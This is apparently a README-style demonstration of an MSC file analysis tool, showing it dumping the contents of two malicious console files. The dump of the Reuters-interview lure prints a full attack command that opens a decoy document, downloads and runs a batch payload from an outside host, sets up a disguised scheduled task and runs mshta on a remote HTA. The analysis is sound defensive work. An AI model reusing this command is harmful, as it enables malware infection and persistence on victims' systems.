# msc_dark_all_day tks for the help adepasquale
https://www.youtube.com/watch?v=ZLVwPZOW4iA
```
coz@genesis:~/Downloads/msc_dark_all_day$ python3 msc_dark_all_day.py --help
usage: msc_dark_all_day.py [-h] [--no-image-hashes] [--clsid-map CLSID_MAP] --input INPUT --output OUTPUT

Extract CommandLine tasks and images from MSC file

options:
  -h, --help            show this help message and exit
  --no-image-hashes     Do not include image hashes in the output
  --clsid-map CLSID_MAP
                        Filename for loading map of CLSID
  --input INPUT         Path to the input MSC file
  --output OUTPUT       Path to the output directory
coz@genesis:~/Downloads/msc_dark_all_day$ python3 msc_dark_all_day.py --clsid-map mmc_clsid_snap_in_map.json --input /home/coz/Downloads/Decryptor.msc --output decryptordump
https://www.youtube.com/watch?v=ZLVwPZOW4iA
Commands, nodes, strings, images, files, json, all the MSC things have been saved to: decryptordump
coz@genesis:~/Downloads/msc_dark_all_day$ ls decryptordump
binary_0  binary_0_image_0.bmp  binary_1  binary_1_image_0.bmp  binary_2  binary_2_image_0.bmp  binary_3  binary_3_image_0.bmp  binary_3_image_1.bmp  binary_4  binary_4_image_0.bmp  binary_5  binary_6  binary_7  binary_7_image_0.bmp  binary_7_image_1.bmp  binary_8  binary_8_image_0.bmp  binary_9  msc_dark_all_day.json
coz@genesis:~/Downloads/msc_dark_all_day$ cat decryptordump/msc_dark_all_day.json
{
    "urls": [
        "https://skorikjr.github.io/webdav/"
    ],
    "strings": [
        "Favorites",
        "Shockwave Flash Object",
        "https://skorikjr.github.io/webdav/",
        "Console Root"
    ],
    "tasks": [],
    "nodes": [
        {
            "id": "1",
            "name": "Console Root",
            "clsid": "{C96401CC-0E17-11D3-885B-00C04F72C717}",
            "clsid_info": {
                "name": "Folder",
                "dll_path": "",
                "dll_name": "mmcbase.dll",
                "str_id": "14008"
            },
            "bitmaps": [
                {
                    "filename": "decryptordump/binary_7",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_7_image_0.bmp",
                            "sha256": "92228c30f33dee6175ae8e00349e5744283a1c657048f451b0379b7593d17478",
                            "sha1": "0af18e5744c61b03db425281c1cbbc164e964429",
                            "md5": "e8912cdf6abf2ccefeb15a2da122edc9",
                            "mime_type": "image/bmp",
                            "ahash": "007e7e7e7e7e7e00",
                            "dhash": "f8daa6b8a2b6a281",
                            "phash": "90913b913f546e6e"
                        },
                        {
                            "filename": "decryptordump/binary_7_image_1.bmp",
                            "sha256": "92228c30f33dee6175ae8e00349e5744283a1c657048f451b0379b7593d17478",
                            "sha1": "0af18e5744c61b03db425281c1cbbc164e964429",
                            "md5": "e8912cdf6abf2ccefeb15a2da122edc9",
                            "mime_type": "image/bmp",
                            "ahash": "007e7e7e7e7e7e00",
                            "dhash": "f8daa6b8a2b6a281",
                            "phash": "90913b913f546e6e"
                        }
                    ],
                    "sha256": "1d6fc37abe1651607658dae3412c179f2fa0745657a8989928eee77fa3d9d381",
                    "sha1": "ebaeb96b3b7c0077fc07380d0cfec8ed3de046a0",
                    "md5": "3f775d6512b0111a2e1d92f172c34fb2",
                    "mime_type": "image/bmp",
                    "ahash": "10f0f0f0f0f0f000",
                    "dhash": "a4a424a424a42440",
                    "phash": "cccc11c8117f333f"
                },
                {
                    "filename": "decryptordump/binary_8",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_8_image_0.bmp",
                            "sha256": "5efcc6cb402d4aa8f22b5efa6414b532f6cea8a8cd1cfec3ab8ee26d9db19a69",
                            "sha1": "414ba257360cf7035ae1392062c38b1693146189",
                            "md5": "c8c59e1cf322318f70e75ed559f772fd",
                            "mime_type": "image/bmp",
                            "ahash": "007e7e7e7e7e7e00",
                            "dhash": "ecaca2aaa2a2a290",
                            "phash": "94943eb63f906b68"
                        }
                    ],
                    "sha256": "1a817253fd5e52fa13fb92be162f91f11b2f37518171ac1cd689696157c75469",
                    "sha1": "a77a80c44c6c24a2f87f2ed08714a9010251366a",
                    "md5": "8ed39b009f93caf8734f3a84a4dc2f58",
                    "mime_type": "image/bmp",
                    "ahash": "40c0c0c0c0c0c000",
                    "dhash": "9090909090909000",
                    "phash": "f0e007c007ff0f1f"
                }
            ],
            "component_data": [
                {
                    "guid": "{C96401CC-0E17-11D3-885B-00C04F72C717}",
                    "guid_info": {
                        "name": "Folder",
                        "dll_path": "",
                        "dll_name": "mmcbase.dll",
                        "str_id": "14008"
                    },
                    "stream": {
                        "filename": "decryptordump/binary_9",
                        "sha256": "b65fb7ae4e758dcfb0aaf51ab005c96ffdfa74d7188a31721fb22ed48b6dc4e7",
                        "sha1": "c42b3d5d91749e3652bd05fbb3448aa1b0e5d6cc",
                        "md5": "d1968e0b21b7859bd3d5d15630c61ee2",
                        "mime_type": "application/octet-stream"
                    }
                }
            ],
            "components": []
        },
        {
            "id": "2",
            "name": "Shockwave Flash Object",
            "clsid": "{C96401CF-0E17-11D3-885B-00C04F72C717}",
            "clsid_info": {
                "name": "ActiveX Control",
                "dll_path": "",
                "dll_name": "mmcbase.dll",
                "str_id": "214"
            },
            "bitmaps": [
                {
                    "filename": "decryptordump/binary_3",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_3_image_0.bmp",
                            "sha256": "768c785a81af9ff4bdea243363e7892a4e6723e670b50ed1607a09415b9a8c83",
                            "sha1": "84f8789521852f487fe787c8b4da011964421c7e",
                            "md5": "1c59f001292fc658282513338655504b",
                            "mime_type": "image/bmp",
                            "ahash": "040404dfdf1fdfdf",
                            "dhash": "2c4c3db43636b636",
                            "phash": "9c72738de9c51c62"
                        },
                        {
                            "filename": "decryptordump/binary_3_image_1.bmp",
                            "sha256": "768c785a81af9ff4bdea243363e7892a4e6723e670b50ed1607a09415b9a8c83",
                            "sha1": "84f8789521852f487fe787c8b4da011964421c7e",
                            "md5": "1c59f001292fc658282513338655504b",
                            "mime_type": "image/bmp",
                            "ahash": "040404dfdf1fdfdf",
                            "dhash": "2c4c3db43636b636",
                            "phash": "9c72738de9c51c62"
                        }
                    ],
                    "sha256": "fd9d984dbefe07cb2324ad119f6b9118ebb7aa6286c3cf77d784a0ebe9093a2b",
                    "sha1": "4a3883a7c41b98c6ea219427734b7abd960615cd",
                    "md5": "32a024febb20564891c9f883516a6f3e",
                    "mime_type": "image/bmp",
                    "ahash": "001000f0f050f0f0",
                    "dhash": "a4a4a4a4a4a4a4a4",
                    "phash": "cc3333c0e7c71077"
                },
                {
                    "filename": "decryptordump/binary_4",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_4_image_0.bmp",
                            "sha256": "077c256142d6b2e800fef9b2eef5f7cfe6f1f4dbccb664f37b28c211ccf71276",
                            "sha1": "c5fbfd69c6734dd7db9033aecc1beb2e5cb0b646",
                            "md5": "3fb491e534a88806a0c960b03e5b956f",
                            "mime_type": "image/bmp",
                            "ahash": "08003fef3fbbbb3f",
                            "dhash": "18787a5e6e66626a",
                            "phash": "977b586833f98486"
                        }
                    ],
                    "sha256": "396066efe7646355f24128653fd7f209e128b51a85a500d51d0c27649c204b9f",
                    "sha1": "0604df7847a1b2bf879a993ab6173b05a6c95bec",
                    "md5": "e05c0a96865b8b30caa7da113b73151c",
                    "mime_type": "image/bmp",
                    "ahash": "4040c0c0c0c0c0c0",
                    "dhash": "a080909090909090",
                    "phash": "f00f0f1f00fff0e0"
                }
            ],
            "component_data": [
                {
                    "guid": "{C96401CF-0E17-11D3-885B-00C04F72C717}",
                    "guid_info": {
                        "name": "ActiveX Control",
                        "dll_path": "",
                        "dll_name": "mmcbase.dll",
                        "str_id": "214"
                    },
                    "stream": {
                        "filename": "decryptordump/binary_5",
                        "sha256": "3e1654f0f310bdd172f56e7aa27aa7e543246b06a5f7d0d2bc90c28f24e5f60c",
                        "sha1": "3253b495ed6ffe77d1428fdba273b9cb8126dc04",
                        "md5": "9b492103e672c13251cf2cebf9351673",
                        "mime_type": "application/octet-stream"
                    }
                }
            ],
            "components": [
                {
                    "guid": "{C96401CF-0E17-11D3-885B-00C04F72C717}",
                    "guid_info": {
                        "name": "ActiveX Control",
                        "dll_path": "",
                        "dll_name": "mmcbase.dll",
                        "str_id": "214"
                    },
                    "storage": {
                        "filename": "decryptordump/binary_6",
                        "sha256": "e2f9816ccb045542372cb7b98fb85cd11fa42336a20f8a23c3157bb7afc6a134",
                        "sha1": "946c2aac56c3cbec501ef6cb214039db3904a545",
                        "md5": "3178d410c74cd414f24f38b6dbf93d45",
                        "mime_type": "application/CDFV2"
                    }
                }
            ]
        }
    ],
    "icons": [
        {
            "icon_index": "0",
            "icon_file": "\\\\185.213.208.245\\htdocs\\payload\\R_icon.ico",
            "images": [
                {
                    "filename": "decryptordump/binary_0",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_0_image_0.bmp",
                            "sha256": "f75cae2c279c5ff6515b3acd329f43f9f63a8b0ee0d030cd68fa7f4fc4207a71",
                            "sha1": "dd8a15f3f39fa1ae4e73e9f05b749dcf3413561f",
                            "md5": "a76c15845fd88e3c078dab5f4ca6b5c5",
                            "mime_type": "image/bmp",
                            "ahash": "00187e7e7e7e1800",
                            "dhash": "9671ccd4d4f4319e",
                            "phash": "94c36f3c7164b2c3"
                        }
                    ],
                    "sha256": "2d77dea1d96514a48f6c75af912d09182bb29805e419620b2c22d5cb73af2401",
                    "sha1": "79bc8688600463ef5db07741cf36deb9740972f1",
                    "md5": "dfc2a92b9121cc7ee0a0e2bdf24afeaf",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c0c0",
                    "dhash": "0080808080808000",
                    "phash": "f0f00f07070ff1f8"
                },
                {
                    "filename": "decryptordump/binary_1",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_1_image_0.bmp",
                            "sha256": "a1818d0de70d66cfe65cf352c9d98b085344fe7f95d8539de38b08cdcc35e8a0",
                            "sha1": "0400b9a0124c54982a1049e932e3a30d7183a247",
                            "md5": "ef95556f58e473a69db66248e08d9ac5",
                            "mime_type": "image/bmp",
                            "ahash": "00187e7e7e7e1800",
                            "dhash": "9671d0d4d4d4719e",
                            "phash": "c49b6c64316cb2db"
                        }
                    ],
                    "sha256": "e55d323b6a9dd323c4904a0be0b4d19bec8f678517f5484c6982fe3aee022884",
                    "sha1": "2c83d499cf7f58b085fc84782f70004339345701",
                    "md5": "700279577fc1c5f5a4bd0147d3710e4c",
                    "mime_type": "image/bmp",
                    "ahash": "80c0c0c0c0c0c0c0",
                    "dhash": "0080808080808080",
                    "phash": "f0f00f07070ff1f8"
                },
                {
                    "filename": "decryptordump/binary_2",
                    "image_list": [
                        {
                            "filename": "decryptordump/binary_2_image_0.bmp",
                            "sha256": "ce311a6ccd00d2299aa113ff0ffebfd2e489a7655b26fc7b2e268c73cbf86587",
                            "sha1": "205b2c800e938a56714db78d58bb3b3f9da98d2d",
                            "md5": "81b0a564447bd08325eabce580e658fe",
                            "mime_type": "image/bmp",
                            "ahash": "00187e7e7e7e1800",
                            "dhash": "9671ccd4d4f4311e",
                            "phash": "94c36f3c7164b2c3"
                        }
                    ],
                    "sha256": "58827f65b50b1410df39cc459368e619b8fc5ce1b9e250507246740444055c16",
                    "sha1": "db565d0b3c63bd5d6e94556e177352eccd9c855d",
                    "md5": "abca43d5a78270f7e885e7148a91f0d0",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c0c0",
                    "dhash": "0080808080808000",
                    "phash": "f0f00f07070ff1f8"
                }
            ]
        }
    ],
    "binaries": []
}coz@genesis:~/Downloads/msc_dark_all_day$ 

coz@genesis:~/Downloads/msc_dark_all_day$ python3 msc_dark_all_day.py --clsid-map mmc_clsid_snap_in_map.json --input '/home/coz/Downloads/Interview by Reuters(SeanKing).msc' --output interviewdump
https://www.youtube.com/watch?v=ZLVwPZOW4iA
Commands, nodes, strings, images, files, json, all the MSC things have been saved to: interviewdump
coz@genesis:~/Downloads/msc_dark_all_day$ ls interviewdump
binary_0  binary_0_image_0.bmp  binary_1  binary_1_image_0.bmp  binary_2  binary_2_image_0.bmp  binary_3  binary_3_image_0.bmp  binary_3_image_1.bmp  binary_4  binary_4_image_0.bmp  binary_5  binary_6  binary_6_image_0.bmp  binary_7  binary_7_image_0.bmp  msc_dark_all_day.json
coz@genesis:~/Downloads/msc_dark_all_day$ cat interviewdump/msc_dark_all_day.json 
{
    "urls": [],
    "strings": [
        "Favorites",
        "Console Root",
        "Security Mode",
        "Open",
        "Interview by Reuters(SeanKing)",
        "Interview by Reuters(SeanKing).docx"
    ],
    "tasks": [
        {
            "name": "Open",
            "description": "Interview by Reuters(SeanKing).docx",
            "command": "cmd.exe",
            "params": "/c mode 15,1&start explorer \"https://docs.google.com/document/d/1R3zhXXsPPWg3an0aV1SqdjlSC1dM17L2/edit?usp=sharing&ouid=110632654410291203272&rtpof=true&sd=true\"&echo On Error Resume Next:Set ws = CreateObject(\"WScript.Shell\"):Set fs = CreateObject(\"Scripting.FileSystemObject\"):Set Post0 = CreateObject(\"msxml2.xmlhttp\"):gpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.gif\":bpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.bat\":If fs.FileExists(gpath) Then:re=fs.movefile(gpath,bpath):re=ws.run(bpath,0,true):fs.deletefile(bpath):Else:Post0.open \"GET\", \"https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/d.php?na=battmp\",False: Post0.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\":Post0.Send:t0=Post0.responseText:Set f = fs.CreateTextFile(gpath,True):f.Write(t0):f.Close:End If:>\"C:\\Users\\Public\\Pictures\\temp.vbs\"&schtasks /create /tn OneDriveUpdate /tr \"wscript.exe /b \"C:\\Users\\Public\\Pictures\\temp.vbs\"\" /sc minute /mo 41 /f&start /min mshta https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/ttt.hta",
            "full_command": "cmd.exe /c mode 15,1&start explorer \"https://docs.google.com/document/d/1R3zhXXsPPWg3an0aV1SqdjlSC1dM17L2/edit?usp=sharing&ouid=110632654410291203272&rtpof=true&sd=true\"&echo On Error Resume Next:Set ws = CreateObject(\"WScript.Shell\"):Set fs = CreateObject(\"Scripting.FileSystemObject\"):Set Post0 = CreateObject(\"msxml2.xmlhttp\"):gpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.gif\":bpath = ws.ExpandEnvironmentStrings(\"%appdata%\") + \"\\Microsoft\\sus.bat\":If fs.FileExists(gpath) Then:re=fs.movefile(gpath,bpath):re=ws.run(bpath,0,true):fs.deletefile(bpath):Else:Post0.open \"GET\", \"https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/d.php?na=battmp\",False: Post0.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\":Post0.Send:t0=Post0.responseText:Set f = fs.CreateTextFile(gpath,True):f.Write(t0):f.Close:End If:>\"C:\\Users\\Public\\Pictures\\temp.vbs\"&schtasks /create /tn OneDriveUpdate /tr \"wscript.exe /b \"C:\\Users\\Public\\Pictures\\temp.vbs\"\" /sc minute /mo 41 /f&start /min mshta https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/ttt.hta",
            "images": [
                {
                    "filename": "interviewdump/binary_6",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_6_image_0.bmp",
                            "sha256": "9ff538eb58d812ca341c6f4376e21b29de2bb8f3c3edd134a0b6d49231759bde",
                            "sha1": "ea9e1124d58cf0325b482f45deef3ec8f28d09c6",
                            "md5": "6d2cda63b06daee5d163e8f43eb3b230",
                            "mime_type": "image/bmp",
                            "ahash": "003ffffff7e00000",
                            "dhash": "626c6ccc8cac7c60",
                            "phash": "868f1f4660797c78"
                        }
                    ],
                    "sha256": "6a2549cb8edc79b88f8c4c7a8020dfae5eb410005ebc11b60da5ae1ca6784879",
                    "sha1": "022408ee5d21ca346205dbf6e4fa576137e610a7",
                    "md5": "052e92cc3ac76434a879aeda00562670",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c040",
                    "dhash": "9090901010109090",
                    "phash": "f0f0001f3f0f1f0f"
                },
                {
                    "filename": "interviewdump/binary_7",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_7_image_0.bmp",
                            "sha256": "1a88a2112bc7181bacb792b81921a7c2134b86bb37130a2aaa7aaabd667de5b3",
                            "sha1": "0b27ff1a387e9ccbddfddc9921abf83aa1ff5905",
                            "md5": "b13497b2e0178c7459c3dc5d75b4676b",
                            "mime_type": "image/bmp",
                            "ahash": "003ffffff7e00000",
                            "dhash": "606a6ccca8ac7860",
                            "phash": "868f1f6660797878"
                        }
                    ],
                    "sha256": "b26e08d0dce5f67e3ce02501bd13f874d0dfaaaf4078c25021e765d996781e08",
                    "sha1": "0ac13b03fb9d6e05d9036e0d6eef141508402251",
                    "md5": "c7993ecba4ab57e5b0de3cba90cebb40",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c040",
                    "dhash": "9090901010109090",
                    "phash": "f0f0001f3f0f1f0f"
                }
            ]
        }
    ],
    "nodes": [
        {
            "id": "1",
            "name": "Console Root",
            "clsid": "{C96401CC-0E17-11D3-885B-00C04F72C717}",
            "clsid_info": {
                "name": "Folder",
                "dll_path": "",
                "dll_name": "mmcbase.dll",
                "str_id": "14008"
            },
            "bitmaps": [
                {
                    "filename": "interviewdump/binary_3",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_3_image_0.bmp",
                            "sha256": "b4538588f48ca8c138cd16b93ee8061328ae43f43884f3c763c8ed40ba1d5c5c",
                            "sha1": "d7beafebb4710e8a3a8be5ef512656d3a03469e9",
                            "md5": "5aa1c078dc279040ffcf8102051a9e78",
                            "mime_type": "image/bmp",
                            "ahash": "00787e7e7e7e0000",
                            "dhash": "e0c298a4a4a0a200",
                            "phash": "c0c46f663a3b913b"
                        },
                        {
                            "filename": "interviewdump/binary_3_image_1.bmp",
                            "sha256": "f4640afcc5032370ca182517aeee5f6cb5842f172afd7003cb0a43f8e89fbea4",
                            "sha1": "0a31b9a3c15e8d2641e2774b8481d0498e93ae8a",
                            "md5": "e3bd4e5b024fad947721610777000ad6",
                            "mime_type": "image/bmp",
                            "ahash": "00787efefc7e0000",
                            "dhash": "e0c29ecaa8d4d401",
                            "phash": "c0c52f427b3fb03a"
                        }
                    ],
                    "sha256": "c08d09065238c90c31f1df782b20689eaf6d027d301c3d625a5154ca1739cbcc",
                    "sha1": "1344aff0b0d501de5808c11d8031f7a7a5292e53",
                    "md5": "116ffc5d4fcdb98d9d543b625a86bad7",
                    "mime_type": "image/bmp",
                    "ahash": "00f0f0f0f0f08000",
                    "dhash": "6860a4a4a4a4a400",
                    "phash": "e6ef1b671118f818"
                },
                {
                    "filename": "interviewdump/binary_4",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_4_image_0.bmp",
                            "sha256": "ebf38fc626831de8d42e29a8b05bb57a0c5e6b14e3f8f502f71339e84466cec6",
                            "sha1": "6ff62e3487cb86b0fd8b68dbc7d6f8d6d7429467",
                            "md5": "5553f21a3ece641c0cf4dfd869d8ad76",
                            "mime_type": "image/bmp",
                            "ahash": "0070fefefefe7e00",
                            "dhash": "c0e4b2aaa2a2a200",
                            "phash": "c4422a813bbdbd3d"
                        }
                    ],
                    "sha256": "11b26fde29d8623e66e176619ccc7e45a2d2913b849206574165cb512dd75151",
                    "sha1": "a7f7dbc45179d4292e53e20e4431b27dcb4702c8",
                    "md5": "d1c6d189ee6119d6c26efa430c2b47e0",
                    "mime_type": "image/bmp",
                    "ahash": "00c0c0c0c0c0c000",
                    "dhash": "0000909090909000",
                    "phash": "f8ff0ff907e0e000"
                }
            ],
            "component_data": [
                {
                    "guid": "{C96401CC-0E17-11D3-885B-00C04F72C717}",
                    "guid_info": {
                        "name": "Folder",
                        "dll_path": "",
                        "dll_name": "mmcbase.dll",
                        "str_id": "14008"
                    },
                    "stream": {
                        "filename": "interviewdump/binary_5",
                        "sha256": "af35e5f56e5a26d3af5dd20b17737c96ba425b54938bcd748536f8e6db9bb369",
                        "sha1": "7d6392fa5946b7241458853c1ad74a8d13f1ef65",
                        "md5": "6b033734de6d83994873976eb5353a31",
                        "mime_type": "application/octet-stream"
                    }
                }
            ],
            "components": []
        }
    ],
    "icons": [
        {
            "icon_index": "0",
            "icon_file": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "images": [
                {
                    "filename": "interviewdump/binary_0",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_0_image_0.bmp",
                            "sha256": "fc4c2550efa3a5871bb0e89faf2404e8bccc27e63d0d0d5c6e95c25a32b7ac3c",
                            "sha1": "68b9f68db728661c379d33e31dbead9fb9aeb9db",
                            "md5": "20172833cd252fa6d4490d5b6e4aaffb",
                            "mime_type": "image/bmp",
                            "ahash": "003ffffff7e00000",
                            "dhash": "606a6ccca8ac7860",
                            "phash": "868f1f6660797878"
                        }
                    ],
                    "sha256": "62be9e23c9dd279ec53b6f975401b464d855f3d0799d9fb225a1a42d997dd717",
                    "sha1": "1034c98ff5965f3a5ba6b2da4f04b880b8a83ba2",
                    "md5": "15423b61b67d225fb60f0db91db8a639",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c040",
                    "dhash": "9090901010109090",
                    "phash": "f0f0001f3f0f1f0f"
                },
                {
                    "filename": "interviewdump/binary_1",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_1_image_0.bmp",
                            "sha256": "3c8123101f9336dd92ed54613bc0286e8d81c76c1e1fc5792160e2b16d1479f9",
                            "sha1": "966aca12cdd3a09c8a25d0d39cf31eaa6cfc3b81",
                            "md5": "684bf019c241feeb5649aabedf78f0bf",
                            "mime_type": "image/bmp",
                            "ahash": "3f3ffbfb70700000",
                            "dhash": "d2ccd6c6a6a656cc",
                            "phash": "c48313c0c0fffd74"
                        }
                    ],
                    "sha256": "23ed9683cc7be1ac3135036ca2e92c36cd22871ae4aec94e181144833d58fe82",
                    "sha1": "9974ec626f9422c32ca94787e1ad0b7767d14c2a",
                    "md5": "d9c0d4256ed550834f59a6f67002a868",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c0c0",
                    "dhash": "9090101010109090",
                    "phash": "f8f000f0f81efe07"
                },
                {
                    "filename": "interviewdump/binary_2",
                    "image_list": [
                        {
                            "filename": "interviewdump/binary_2_image_0.bmp",
                            "sha256": "1b8a5add928ab793e84a812116eeedf43abec3355a0f06ea31b1decf3703c2cf",
                            "sha1": "e7068adcf7db7a484a795a2ac63db7ace2084871",
                            "md5": "958b6c3d84be1244ac3b8b6281d5a61d",
                            "mime_type": "image/bmp",
                            "ahash": "003ffffff6000000",
                            "dhash": "e2fa5aca8a8a7a62",
                            "phash": "87871f66607c7878"
                        }
                    ],
                    "sha256": "1be37fcf1a87fbb10b75c123b970fd94473ed0b8f5517f8a12858222b1cdd0f8",
                    "sha1": "fa47660c55853e3e474f01b74ee54b56563b9672",
                    "md5": "f0e027d8ee52d345238e70d709f92951",
                    "mime_type": "image/bmp",
                    "ahash": "c0c0c0c0c0c0c040",
                    "dhash": "9090901010109090",
                    "phash": "f0f0001f3f0f0f1f"
                }
            ]
        }
    ],
    "binaries": []
}


